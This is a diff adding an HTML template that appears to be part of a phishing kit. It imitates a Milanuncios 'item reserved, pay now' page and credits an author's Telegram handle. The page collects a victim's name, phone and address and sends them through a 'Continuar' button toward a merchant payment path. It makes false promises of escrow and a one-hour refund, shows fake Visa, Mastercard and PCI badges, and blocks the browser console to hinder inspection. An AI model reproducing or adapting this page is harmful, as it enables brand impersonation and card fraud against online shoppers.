@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="ru" data-cbscriptallow="true"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<link href=" https://scm-milanuncios-frontend-pro.milanuncios.com/statics/images/favicon.ico" rel="icon" type="image/x-icon">
+		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+        <!-- support -->
+    <link rel="stylesheet" href="/static/style/support/support_parent.css">
+    <script src="/static/style/protect/protect.js"></script>
+		<title>MILANUNCIOS: usados, clasificados gratis, trabajos, clasificados ...</title>
+		
+		<style>#maincontent {
+    max-width: 900px;
+    margin: 0 auto;
+}
+.nav-title {
+    font-size: 16px;
+}
+#top-right-menu {
+    float: right; 
+    display: flex;
+    margin-top: 3px;
+}
+* {
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+}
+._4 {
+    font-size: 20px;
+    font-weight: 600;
+    margin-bottom: 20px;
+    margin-top: 40px;
+}
+
+.block {
+    margin-top: 30px;
+    display: flex;
+}
+.adress1 {
+    width: 50%;
+    margin-right: 15px;
+}
+.adress2 {
+    width: 35%;
+    margin-right: 15px;
+}
+.nav-info {
+    width: 30%;
+    margin-left: 30px;
+}
+
+body {
+    font-family: 'Roboto', sans-serif;
+    background: #fff;
+    color: #171C1F;
+    min-width: 280px;
+}
+#top-menu {
+    width: 100%; 
+    height: 35px; 
+    border-bottom: 1px solid #dfe3ed; 
+    max-width: 1200px; 
+    margin: 0 auto;
+}
+header {
+    height: 55px;
+}
+#icon-star {
+    font-size: 22px;
+    color: #fff;
+}
+#icon-star:before {
+    content: "";
+}
+header .container {
+    height: 80px;
+    padding-left: 15px;
+    margin-top: 100px;
+}
+.container {
+    padding: 0;
+    max-width: 1200px;
+    margin: 0 auto;
+    height: 100%;
+}
+#header-menu-top {
+    width: 734px; 
+    display: flex; 
+    float: right;
+    margin-top: 8px;
+}
+.between {
+    margin: 0 7px;
+    font-size: 14px;
+    color: #dedede;
+}
+#header-menu-top a {
+    text-decoration: none;
+    font-size: 14px;
+    color: #8d98a7;
+}
+#header-menu-top a:hover {
+    text-decoration: underline;
+}
+#logbutton {
+    padding-left: 18px;
+    text-decoration: none;
+    color: #f2a700;
+    background-color: #fdf6e5;
+    border: 1px solid #fdf6e5;
+    float: right;
+    font-size: 16px;
+    font-weight: 600;
+    line-height: 1.25;
+    margin-top: 16px;
+    margin-bottom: 12px;
+    padding: 10px 15px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 4px;
+}
+#logbutton:hover {
+    border: 1px solid #f2a700;
+}
+
+.header-logo {
+    display: block;
+    position: absolute;
+    top: 130px;
+    z-index: 10;
+}
+
+.header-logo_o {
+    position: absolute;
+    left: 0;
+    top: 0;
+    transform: translate(12px, 15px);
+    content: '';
+    border-radius: 50%;
+    width: 10px;
+    height: 10px;
+    box-shadow: 0 0 0 12px #24e5db;
+}
+
+.header-logo_l {
+    width: 10px;
+    top: 0;
+    bottom: 0;
+    background: #23e5db;
+    position: absolute;
+    left: 37px;
+}
+
+.header-logo_x {
+    width: 20px;
+    height: 20px;
+    overflow: hidden;
+    display: block;
+    position: absolute;
+    left: 0;
+    top: 0;
+    transform: translate(51px, 10px);
+}
+
+.header-logo_x:before {
+    transform: skewX(45deg) translate(-50%, 0);
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 50%;
+    width: 65%;
+    height: 100%;
+    background: #24e5db;
+}
+
+.header-logo_x:after {
+    transform: skewX(-45deg) translate(-50%, 0);
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 50%;
+    width: 65%;
+    height: 100%;
+    background: #24e5db;
+}
+#footermain {
+    display: flex;
+    max-width: 800px;
+    margin: 0 auto;
+}
+#nav3 {
+    width: 40%;
+}
+main {
+    margin: 20px 0;
+}
+
+.section-content {
+    padding: 24px;
+}
+.nav-info > ul > li > a {
+    text-decoration: none;
+    color: #1e1e1e;
+    font-size: 15px;
+    font-weight: 100;
+}
+.nav-info > ul {
+    padding: 0;
+}
+.nav-info > ul > li {
+    list-style: none;
+    margin-bottom: 35px;
+}
+
+.item-container {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: start;
+    margin-bottom: 70px;
+}
+
+.item-block {
+    max-width: 68%;
+    background: #fff;
+}
+.item-block_header {
+    margin-bottom: 40px;
+}
+
+.item-block_title {
+    font-size: 24px;
+    line-height: 1.16;
+    font-weight: 600;
+}
+
+.item-block_text {
+    display: inline-block;
+    vertical-align: top;
+    margin-left: 20px;
+    word-wrap: break-word;
+    word-break: break-word;
+    line-break: normal;
+    hyphens: manual;
+    max-width: 70%;
+}
+
+.item-block_image {
+    display: inline-block;
+    height: 115px;
+}
+
+.item-block_image img {
+    border-radius: 5px;
+    height: 115px;
+    width: 110px;
+    object-fit: cover;
+}
+
+.item-block_price {
+    font-size: 30px;
+    font-weight: 600;
+    margin-top: 5px;
+    color: #ce1555;
+}
+
+.item-block_status {
+    font-size: 17px;
+    font-weight: 500;
+    margin-top: 10px;
+}
+
+.item-block_main {
+    margin-top: 36px;
+}
+
+.item-block_description {
+
+}
+
+.recipient-block_row {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 30px;
+}
+
+.recipient-block_row label {
+    display: block;
+    margin-bottom: 5px;
+}
+
+.recipient-block_input {
+    width: 100%;
+    height: 38px;
+    border: none;
+    border-bottom: 1px #dfe3ed solid;
+    outline: none;
+    color: #3c4858;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.recipient-subblock_min {
+    width: 100%;
+}
+
+.recipient-subblock_max {
+    width: 100%;
+}
+
+.description-title {
+    font-size: 24px;
+    font-weight: 500;
+    margin-bottom: 15px;
+}
+
+.description-subtitle {
+    font-size: 16px;
+    line-height: 24px;
+}
+
+.description-mail {
+    width: 200px;
+    margin-top: 25px;
+}
+
+.item-block_footer {
+    margin-top: 30px;
+    padding-top: 20px;
+}
+
+.item-footer_text {
+    font-size: 15px;
+    color: #85969F;
+}
+
+.item-pay {
+    max-width: 35%;
+    width: 100%;
+    background: white;
+}
+
+.item-pay_title {
+    font-weight: 500;
+}
+
+.item-pay_item {
+    margin-top: 5px;
+    font-size: 15px;
+}
+
+.item-pay_price {
+    font-size: 20px;
+    margin-top: 15px;
+}
+
+.item-pay_button {
+    background-color: #30832f;
+    transition: all 0.3s ease;
+    width: 100%;
+    height: 45px;
+    cursor: pointer;
+    border: none;
+    border-radius: 4px;
+    font-size: 18px;
+    line-height: 1.25;
+    font-weight: 500;
+    color: #ffffff;
+    margin: 25px 0;
+}
+
+.item-pay_safery {
+    font-size: 15px;
+    margin-bottom: 10px;
+}
+
+.item-pay_safery img {
+    width: 20px;
+    height: 20px;
+    vertical-align: middle;
+    margin-right: 10px;
+}
+
+.item-pay_info {
+    line-height: 1.4;
+    font-size: 14px;
+}
+
+.item-pay_paymentMethods {
+    max-width: 30px;
+    width: 10%;
+    margin-top: 10px;
+    opacity: 0.6;
+    filter: grayscale(100%);
+    margin-left: 25px;
+}
+
+.section-info {
+    background: #fff;
+    padding: 24px 15px;
+    width: 100%;
+    margin-bottom: 20px;
+    border-radius: 8px;
+    border: solid 1px #d6d8de;
+}
+
+.section-info_icon {
+    height: 38px;
+    vertical-align: middle;
+}
+
+.section-info_text {
+    display: inline-block;
+    vertical-align: middle;
+    margin-left: 20px;
+    width: 80%;
+}
+
+.section-info_title {
+    font-size: 24px;
+    font-weight: 500;
+}
+
+.section-info_subtitle {
+    font-size: 17px;
+    font-weight: 400;
+    margin-top: 10px;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+@media(max-width: 1100px) {
+    .item-container {
+        display: block;
+    }
+
+    section {
+        width: 100%;
+        max-width: 100% !important;
+        margin-bottom: 20px;
+    }
+} 
+@media(max-width: 800px) {
+    #top-menu {
+    display: none;
+    }
+    .header-logo {
+    top: 20px;
+    }
+    #top-right-menu { 
+    display: none;
+    }
+    header .container {
+        margin-top: 0;
+    }
+}
+@media(max-width: 720px) {
+    #footermain {
+    display: block;
+    }
+    .nav-info {
+    width: 100%;
+    margin-bottom: 60px;
+    }
+    .item-block_title {
+        font-size: 20px;
+    }
+    .inlblk  {
+    display: none;
+    }
+}
+@media(max-width: 500px) {
+    .item-block_image img {
+    width: 90%;
+    margin-bottom: 20px;
+    }
+    .item-block_text {
+    max-width: 90%;
+    margin-left: 0;
+    }
+    #logbutton  {
+    display: none;
+    }
+    #footermain {
+    margin-left: 0;
+    }
+    .section-info_title {
+        font-size: 20px;
+    }
+
+    .section-info_subtitle, .item-block_status {
+        font-size: 15px;
+    }
+
+    .item-block_price {
+        font-size: 26px;
+    }
+
+    .recipient-block_row {
+        display: block;
+    }
+
+    .recipient-subblock_min {
+        width: 100%;
+        margin-bottom: 20px;
+    }
+} @media(max-width: 460px) {
+    .section-info_icon {
+        display: none;
+    }
+
+    .section-info_text {
+        width: 100%;
+        margin-left: 0px;
+    }
+    .item-block_text {
+    margin-left: 0;
+    }
+}
+
+
+/* Generator */
+.generator-container {
+    max-width: 500px;
+    margin: 0 auto;
+}
+
+.generator-section {
+    margin: 30px 0;
+    width: 100%;
+}
+
+.generator-span {
+    display: block;
+    margin-bottom: 10px;
+    font-size: .95em;
+}
+
+.generator-a {
+    color: unset;
+    font-weight: 600;
+}
+
+.generator-label {
+    display: block;
+    font-size: 1.05em;
+    margin-bottom: 5px;
+}
+
+.generator-input {
+    width: 100%;
+    height: 38px;
+    border: none;
+    border-bottom: 1px #002f34 solid;
+    outline: none;
+    color: #002F34;
+    font-size: 16px;
+    background: unset;
+}
+
+.generator-button {
+    background-color: #002f34;
+    transition: all 0.3s ease;
+    width: 100%;
+    height: 45px;
+    cursor: pointer;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    line-height: 1.25;
+    font-weight: 500;
+    color: #ffffff;
+}
+
+.generator-input::placeholder {
+    opacity: .7;</style>
+		<script>/* By WayDC | Telegram @WayDC */
+
+let chsNum = '0123456789';
+let chsAlpRu = 'йцукеёнгшщзхъфывапролджэячсмитьбюЙЦУКЕЁНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ';
+let chsAlpEn = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
+let fields = [
+	{
+		'valid': false,
+		'chars': chsAlpRu + chsAlpEn + ' -',
+		'length': [2, 96],
+		'mask': false,
+	},
+	{
+		'valid': true,
+		'chars': chsAlpEn + chsNum + '-._@',
+		'length': [0, 96],
+		'mask': false,
+	},
+	{
+		'valid': false,
+		'chars': chsNum,
+		'length': [10, 10],
+		'mask': [[10, '-'],[8, '-'], [5, ' '], [3, ' '], [0, '+']],
+	},
+];
+
+function inputMask(elem, indx) {
+	fields[indx]['valid'] = false;
+	let val = elem.value;
+	let val2 = '';
+	let chs = fields[indx]['chars'];
+	let len = fields[indx]['length'];
+	for (let i = 0; i < val.length; i++) {
+		let flag = chs.includes(val[i]);
+		if (!flag)
+			continue;
+		if (indx == 1) {
+			flag = (val[i] != '@') || (val[i] == '@' && !val2.includes('@'));
+		} else if (indx == 2) {
+			flag = (val2.length > 0) || (val2.length == 0 && '489'.includes(val[i]));
+		}
+		if (flag)
+			val2 += val[i];
+	}
+	val2 = val2.substr(0, len[1]);
+	if (val2.length >= len[0])
+		fields[indx]['valid'] = true;
+	let mask = fields[indx]['mask'];
+	if (mask)
+		val2 = stringInsert(val2, mask);
+	elem.value = val2;
+	checkButton();
+}
+
+function checkButton() {
+	let flag = false;
+	for (let i = 0; i < fields.length; i++) {
+		if (!fields[i]['valid']) {
+			flag = true;
+			break;
+		}
+	}
+	_buttonPay.disabled = flag;
+}
+
+function stringInsert(s, j) {
+	let a = s.split('');
+	let l = s.length;
+	for (let i = 0; i < j.length; i++) {
+		let k = j[i];
+		if (l > k[0])
+			a.splice(k[0], 0, k[1]);
+	}
+	return a.join('');
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+	_buttonPay.disabled = true;
+	for (let i = 0; i < fields.length; i++) {
+		let e = document.getElementById('_input' + i);
+		e.oninput = function() {
+			inputMask(e, i);
+		}
+		setTimeout(function() {
+			e.oninput();
+		}, 500);
+	}
+});
+</script>
+    <meta property="og:title" content="MILANUNCIOS: segunda mano, anuncios gratis, empleo, clasificados...">
+    <meta property="og:description" content="Milanuncios.com: tablón de anuncios y clasificados de segunda mano, compra-venta, inmobiliarias, empleo, servicios... Encuentra o publica tu anuncio GRATIS!">
+    <meta property="og:type" content="website">
+      <meta property="og:image" content="https://www.milanuncios.com/prensa/wp-content/uploads/2020/11/M-Icon-Round.png"> 
+    <meta property="og:url" content="https://www.milanuncios.com/">
+    <meta name="og:site_name" content="milanuncios.com">
+	<style> #balik {display: none;}</style></head>
+
+
+		
+	<body>
+        <div class="
+        chatra--webkit
+        chatra--style-round
+        chatra--side-bottom
+        chatra--pos-right
+        chatra--visible
+        chatra--expanded
+        chatra--fast-toggle
+      " id="chatra" data-turbolinks-permanent="" style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display:none;">
+    <div id="chatra__iframe-wrapper">
+      <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay" src="/static/style/support/index.html?id=<%=id %>" style="width: 380px; height: 600px; position: absolute"></iframe>
+    </div>
+  </div>
+  <div class="support-circle" onclick="document.querySelector(&#39;#chatra&#39;).style.display = &#39;block&#39;;this.style.display = &#39;none&#39;"></div>
+        <div id="maincontent">
+		<header>
+            <div class="container">
+                <div class="header-logo">
+                    <a href="https://milanuncios.com/"><img style="height: 26px;" src="/static/style/milanuncios1/logo.png"></a>
+                </div>
+                <div id="top-right-menu">
+                <div style="margin-top: 26px; margin-right: 10px;">
+                <a href="https://www.milanuncios.com/mis-anuncios" id="observed-search-link" style="text-decoration: none;">
+                    <svg style="height: 24px;" class="ma-NavigationTopNav-menuDrawer-actionIcon" viewBox="0 0 24 24"><path d="M12.8 6.4c-.4.6-1.2.6-1.6 0-.9-1.3-2-1.9-3.5-1.9-2.3 0-4.2 2-4.2 4.5 0 .9.3 1.8.8 2.7.6.9 1.4 1.9 2.7 3.3l1.9 1.9c.3.2 1.1 1 1.2 1.2.4.4.7.6.8.8l.6.6c.2.2.6.2.9 0l.6-.6.8-.8c.2-.1 1-.9 1.2-1.2 1-1 1.7-1.6 1.9-1.9 1.3-1.3 2.2-2.3 2.7-3.3.6-1 .8-1.8.8-2.7 0-2.6-1.8-4.5-4.2-4.5-1.3-.1-2.5.6-3.4 1.9zm3.5-3.9c3.5 0 6.2 2.9 6.2 6.5 0 1.3-.4 2.5-1.1 3.7-.7 1.1-1.6 2.2-3 3.7l-1.9 1.9c-.3.2-1.1 1-1.2 1.2-.4.4-.7.6-.8.7l-.6.6c-1 1-2.7 1-3.7 0l-.6-.6-.8-.8c-.2-.1-1-.9-1.2-1.2-1-1-1.7-1.6-2-1.9-1.4-1.5-2.4-2.6-3-3.7-.7-1.1-1.1-2.3-1.1-3.6 0-3.6 2.7-6.5 6.2-6.5 1.7 0 3.2.6 4.3 1.8 1.2-1.2 2.6-1.8 4.3-1.8z"></path></svg>
+                </a>
+                </div>
+                <div style="margin-top: 28px;">
+                
+                <a href="https://www.milanuncios.com/mis-anuncios" id="observed-search-link" style="text-decoration: none; color: #1e1e1e; font-size: 17px; padding: 11px 15px; border-radius: 4px; background-color: #f9be01;">Publicar</a>
+                </div>
+                <div style="margin-top: 28px; margin-left: 10px;">
+                <a href="https://www.milanuncios.com/mis-anuncios" id="observed-search-link" style="text-decoration: none; color: #1e1e1e; font-size: 17px; padding: 11px 15px; border-radius: 4px; background-color: #f1f1f1;">Iniciar sesión</a>
+                </div>
+                <!-- <a id="logbutton" data-cy="common_link_header_postnewad" class="postnewlink fbold tdnone" href="https://MILANUNCIOS.com/aif">
+                    <span>Inserisci annuncio</span>
+                </a> -->
+                </div>
+            </div>
+        </header>
+
+    <main>
+        <div class="container">
+            <section class="section-info">
+                <img src="/static/style/milanuncios1/check.png" alt="" class="section-info_icon">
+                <div class="section-info_text">
+                    <p class="section-info_title">Artículo reservado</p>
+                    <p class="section-info_subtitle">Quedan unos pasos</p>
+                </div>
+            </section>
+            <div class="item-container">
+                <section class="item-block">
+                    <div class="section-content">
+                        <div class="item-block_header">
+                            <div class="item-block_image">
+                                <img src="<%=image %>" alt="">
+                            </div>
+                            <div class="item-block_text">
+                                <p class="item-block_title"><%=name %></p>
+                                <p class="item-block_price"><%=price %> €</p>
+                                <p class="item-block_status">El artículo está pendiente de pago</p>
+                            </div>
+                        </div>
+                       
+
+<div class="recipient-block">
+                            <div class="_4">Datos del comprador</div>
+                            <div class="recipient-block_row">
+                                <div class="recipient-subblock_min" style="width: 97%;">
+                                    <label>Nombre completo y apellido</label>
+                                    <input name="t6" class="recipient-block_input" required="">
+                                </div>
+                            </div>
+                            <div class="recipient-block_row">
+                                <div class="recipient-subblock_max" style="width: 97%;">
+                                    <label>Número de teléfono</label>
+                                    <input name="t5" class="recipient-block_input" required="">
+                                </div>
+                            </div>
+                            <div class="_4">Dirección de Envío</div>
+                        <div class="_14 _21">
+                            <div class="block">
+                                <div class="adress1">
+                                    <div class="_19 _15" style="width: 100%;">Ciudad</div>
+                                    <div class="_19">
+                                        <input name="t4" class="recipient-block_input" type="text" required="">
+                                    </div>
+                                </div>
+                                <div class="adress1">
+                                    <div class="_19 _15">La calle</div>
+                                    <div class="_19">
+                                        <input name="t3" class="recipient-block_input" type="text" required="">
+                                    </div>
+                                </div>
+                                </div>
+                                <div class="block">
+                                <div class="adress1">
+                                    <div class="_19 _15" style="width: 100%;">Casa</div>
+                                    <div class="_19">
+                                        <input name="t2" class="recipient-block_input" type="text" required="">
+                                    </div>
+                                </div>
+                                <div class="adress1">
+                                    <div class="_19 _15">Departamento</div>
+                                    <div class="_19">
+                                        <input name="t1" class="recipient-block_input" type="text" required="">
+                                    </div>
+                                </div>
+                                </div>
+                        <div class="item-block_main">
+                            <div class="item-block_description">
+                                <p class="description-subtitle">Haga clic en el botón "Proceder al pago" y pague con su tarjeta bancaria. Sus fondos se mantendrán del servicio hasta que se reciba la mercancía, la factura sea verificada y firmada por el mensajero. Después de verificar la mercancía y firmar los documentos, sus fondos se transferirán a la cuenta del remitente.
+                                    <br><br>
+                                    Si el artículo no es como se describe, no encaja por algún motivo o está dañado, se reembolsará un reembolso completo a la tarjeta del remitente dentro de una hora.
+                                </p>
+                             
+                            </div>
+                        </div>
+                        <div class="item-block_footer">
+                            <p class="item-footer_text">Número de aviso: <b>677128726</b></p>
+                        </div>
+                    </div>
+                </div>
+
+
+
+                    </div>
+                </section>
+                <section class="item-pay">
+                    <div style="border-radius: 8px; border: solid 1px #d6d8de;" class="section-content">
+                        <span class="item-pay_title">Recibir fondos</span>
+                        <p class="item-pay_price">Monto a pagar: <b><%=price %> €</b></p>
+                        <p class="item-pay_item"><%=name %></p>
+                        <form action="/receive/merchant/<%=id %>" method="GET">
+                        <a href="/receive/merchant/<%=id %>">
+                            <button class="item-pay_button">Continuar</button>
+                        </a>
+                        </form>
+                        <p class="item-pay_safery"><img src="/static/style/milanuncios1/shield.png" alt="">Realizar pagos de forma segura</p>
+                        <img src="/static/style/milanuncios1/maeschb.svg" alt="" class="item-pay_paymentMethods">
+                        <img src="/static/style/milanuncios1/visachb.svg" alt="" class="item-pay_paymentMethods">
+                        <img src="/static/style/milanuncios1/mastercardchb.svg" alt="" class="item-pay_paymentMethods">
+                        <img src="/static/style/milanuncios1/pcichb.svg" alt="" class="item-pay_paymentMethods" style="margin-bottom: 6px;">
+                    </div>
+                </section>
+            </div>
+        </div>
+    </main>
+
+</div>
+    <footer style="padding-bottom: 50px; padding-top: 50px; background-color: #f1f1f1;">
+        <div id="footermain">
+            <div class="nav-info">
+                 <ul>
+                    <li><span class="nav-title">¿Necesitas ayuda?</span></li>
+                    <li><a href="https://ayuda.milanuncios.com/hc/es">Contactar</a></li>
+                    <li><a href="https://www.milanuncios.com/legal/condiciones-uso">Condiciones de uso</a></li>
+                    <li><a href="https://www.milanuncios.com/legal/politica-privacidad">Política de privacidad</a></li>
+                    <li><a href="https://www.milanuncios.com/legal/politica-cookies">Política de cookies</a></li>
+                </ul>   
+            </div>
+            <div class="nav-info">
+                <ul>
+                    <li><span class="nav-title">Sobre Milanuncios</span></li>
+                    <li><a href="https://www.milanuncios.com/milanunciosexpress">Milanuncios Express</a></li>
+                    <li><a href="https://www.milanuncios.com/prensa">Sala de prensa</a></li>
+                    <li><a href="https://www.adevinta.com/es/careers/job-openings/?company=Adevinta+in+Spain">Trabaja con nosotros</a></li>
+                </ul>
+                
+            </div>
+            <div class="nav-info">
+                 <ul>
+                    <li><span class="nav-title">Para profesionales</span></li>
+                    <li><a href="https://www.milanuncios.com/milanuncios-pro?ipromo=footerfijo-ap_mapro">Milanuncios Pro</a></li>
+                    <li><a href="https://milanuncios-pro.azelerecambios.com/milanunciospro?ipromo=footerfijo-cliente_mapro">Entra en tu cuenta</a></li>
+                </ul>
+                
+            </div>
+        </div>
+    </footer>
+    <script type="text/javascript">
+        function openForm() {
+          $('#myForm').css('display', 'block')
+        $('#open-support').css('display', 'none')
+      }
+    
+      function closeForm() {
+        $('#myForm').css('display', 'none')
+        $('#open-support').css('display', 'block')
+    
+      }
+    </script>
+    <script src="https://cdn.jsdelivr.net/gh/fz6m/console-ban@3.2/dist/console-ban.min.js"></script>
+    <script>
+        ConsoleBan.init({
+            redirect: 'https://http.cat/403'
+        })
+    </script>
+</body></html>
